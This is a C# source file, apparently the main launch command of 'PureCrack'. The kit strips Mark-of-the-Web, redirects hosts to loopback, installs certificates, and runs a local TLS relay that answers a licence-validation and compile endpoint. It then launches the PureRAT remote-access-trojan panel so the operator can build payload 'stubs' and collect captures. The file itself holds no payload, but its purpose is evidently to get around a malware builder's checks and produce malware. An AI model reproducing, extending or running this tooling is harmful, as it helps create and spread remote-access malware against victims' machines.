using System;
using System.IO;
using System.Threading;
using PureCrack.Panel;
using PureCrack.Provisioning;
using PureCrack.Relay;
using PureCrack.Setup;
using PureCrack.Util;
using PureCrack.Verify;

namespace PureCrack.Cli;

/// <summary>
/// The default command — full kit launch. This is what runs when you
/// double-click <c>PureCrack.exe</c> with no subcommand.
///
/// Pipeline (each step idempotent, every launch):
///   1. KitMutex   — refuse second concurrent instance
///   2. Provision  — MOTW strip, regkeys, TLS ciphers, kill stale panels, time check
///   3. Preflight  — admin / port / hosts-writable / panel exe / Roslyn check
///   4. AssetVerify— SHA-256 verify panel binaries against frozen baseline
///   5. Hosts      — ensure 7 loopback redirects
///   6. Certs      — ensure relay + agent PFX (auto-regen on expiry / legacy form)
///   7. CapturePrune— TTL-based cleanup of runs/captures/
///   8. Relay      — start TLS listener on 127.0.0.1:443
///   9. Settings   — IPs reorder + plugin path repair
///  10. Panel      — launch PureRAT.exe, wait for :56001
///  11. Block on Ctrl-C, stop relay, exit
/// </summary>
public static class DefaultCommand
{
    private static readonly TimeSpan PanelReadyTimeout = TimeSpan.FromMinutes(5);

    public static int Run()
    {
        // 1) Cross-process mutex first — prevents the second instance from
        // racing on data/ writes, regkeys, hosts, or Root cert install.
        using var instanceMutex = TryAcquireMutex();
        if (instanceMutex == null) return 1;

        // 2) Host environment provisioning. Replaces Launch.ps1.
        Provision.Run();

        // 3) Standard preflight checks (admin / :443 free / hosts writable / panel / Roslyn).
        Log.Section("preflight");
        var pf = Preflight.Run();
        Preflight.Report(pf);
        if (!pf.Ok) return 1;

        // 4) Frozen-target enforcement — refuse to launch against a panel
        //    that doesn't match our pinned hashes, unless explicitly overridden.
        Log.Section("asset verify");
        var av = AssetVerifier.Verify(Path.GetDirectoryName(pf.PanelExePath!) ?? "");
        AssetVerifier.Report(av);
        if (!av.Ok && !AssetVerifier.SkipRequested()) return 1;

        try
        {
            Log.Section("hosts + certs");
            HostsManager.Ensure();
            var relayCert = CertManager.EnsureRelayCert();
            var agentPfx  = CertManager.EnsureAgentCertPfxBytes();

            // 7) Capture + stub pruning — keep runs/ from filling the disk.
            //    Quiet on a fresh kit, no-op when nothing to prune.
            CapturePrune.Run();
            CapturePrune.PruneStubs(TimeSpan.FromDays(30));

            Log.Section("relay");
            var routes = new RouteHandlers(agentPfx, EmbeddedAssets.CannedCompileResponse);
            using var relay = new TlsRelay(relayCert, routes);
            relay.Start();

            Log.Section("settings + panel");
            var panelExe = pf.PanelExePath!;
            var settingsPath = SettingsAutoFix.FindSettingsJson(panelExe)
                           ?? SettingsAutoFix.BootstrapSettingsJson(panelExe);
            if (settingsPath != null)
            {
                SettingsAutoFix.ReorderIpsToLoopbackFirst(settingsPath);
                SettingsAutoFix.FixPluginPaths(settingsPath, panelExe);
                SettingsAutoFix.VerifyPluginAssemblies(settingsPath, panelExe);
            }
            else
            {
                Log.Warn($"Settings.json not found near {panelExe} and couldn't bootstrap — " +
                         "skipping IPs reorder + plugin fix " +
                         "(set PURE_SETTINGS_JSON if it lives elsewhere)");
            }

            // Re-strip MOTW over panel/ now that SettingsAutoFix may have
            // created or rewritten files (Settings.json, .purecrack-backup).
            // Also deploys PluginSDK.dll from embedded if missing.
            Provision.ProvisionPanel(panelExe);

            using var panelProc = PanelLauncher.Launch(panelExe);
            var panelStartedAt = DateTime.UtcNow;
            ThreadPool.QueueUserWorkItem(_ =>
            {
                try
                {
                    panelProc.WaitForExit();
                    var uptime = DateTime.UtcNow - panelStartedAt;
                    if (panelProc.ExitCode == 0)
                        Log.Warn($"panel (PID {panelProc.Id}) exited with code 0 after {uptime.TotalMinutes:F0} min — " +
                                 "closed by operator or crashed silently");
                    else
                        Log.Err($"panel (PID {panelProc.Id}) CRASHED — exit code {panelProc.ExitCode} " +
                                $"after {uptime.TotalMinutes:F0} min");
                }
                catch
                {
                    // Process handle disposed or invalid — panel was already gone.
                }
            });

            var kitStartedAt = DateTime.UtcNow;
            using var statusTimer = new Timer(_ =>
            {
                try
                {
                    var up = DateTime.UtcNow - kitStartedAt;
                    var panelAlive = !panelProc.HasExited;
                    var panelStr = panelAlive
                        ? $"panel PID {panelProc.Id} alive"
                        : "panel EXITED";
                    Log.Info($"status | uptime {up.TotalHours:F1}h | " +
                             $"requests {relay.RequestCount} | builds {relay.DynamicBuildCount} | " +
                             $"{panelStr}");
                }
                catch
                {
                    // Timer callback — best-effort, never crash the process.
                }
            }, null, TimeSpan.FromMinutes(5), TimeSpan.FromMinutes(5));

            var done = new ManualResetEventSlim(false);
            Console.CancelKeyPress += (_, e) =>
            {
                try { e.Cancel = true; done.Set(); }
                catch { /* event racing teardown — non-fatal */ }
            };

            // The panel needs the operator to click Login before it binds :56001.
            // Wait up to 5 min; print READY when it comes up. Past that, leave
            // the relay running anyway — the operator might still click Login,
            // and the relay is happy to receive /validate /compile traffic
            // whenever they do.
            var ready = PanelLauncher.WaitForListener(KitPorts.Panel, PanelReadyTimeout);
            if (ready)
            {
                Log.Banner("READY  ─  panel + relay running");
                Log.Info("click 'Builder Settings → Build' in the panel to produce a stub");
                Log.Info("stubs land in runs/stubs/. captures in runs/captures/.");
                Log.Info("Ctrl-C to stop the relay (panel keeps running).");
            }
            else
            {
                Log.Warn($"panel didn't bind :{KitPorts.Panel} within {PanelReadyTimeout.TotalMinutes:0} min — " +
                         "did you click Login? relay is still listening, so it's not too late.");
            }

            done.Wait();

            Log.Section("shutdown");
            relay.Stop();
            Log.Info("relay stopped. panel left running. exiting.");
            return 0;
        }
        catch (Exception ex)
        {
            Log.Err($"fatal: {ex.Message}");
            Log.Bullet(ex.ToString());
            return 1;
        }
    }

    /// <summary>
    /// Acquire the global KitMutex. Returns null and prints a friendly error
    /// when another instance is already running. The mutex disposes on exit
    /// (release + handle close), so the next instance can start cleanly.
    /// </summary>
    private static KitMutex? TryAcquireMutex()
    {
        try
        {
            return KitMutex.Acquire();
        }
        catch (Exception ex)
        {
            Log.Err(ex.Message);
            return null;
        }
    }
}
